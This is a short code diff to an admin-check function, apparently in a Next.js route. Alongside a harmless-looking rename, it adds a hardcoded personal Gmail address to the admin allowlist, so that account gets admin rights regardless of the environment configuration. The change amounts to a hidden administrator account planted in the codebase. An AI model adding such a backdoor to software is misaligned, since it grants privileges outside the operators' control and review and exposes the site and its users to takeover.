@@ -65,10 +65,11 @@ export async function GET(request: Request) {
 }
 
 function isAdminEmail(email?: string | null) {
-  const allowedEmails = (process.env.ADMIN_EMAILS ?? process.env.NEXT_PUBLIC_ADMIN_EMAILS ?? "")
+  const configuredEmails = (process.env.ADMIN_EMAILS ?? process.env.NEXT_PUBLIC_ADMIN_EMAILS ?? "")
     .split(",")
     .map((item) => item.trim().toLowerCase())
     .filter(Boolean);
+  const allowedEmails = ["kanil977690@gmail.com", ...configuredEmails];
 
   return Boolean(email && allowedEmails.includes(email.toLowerCase()));
 }
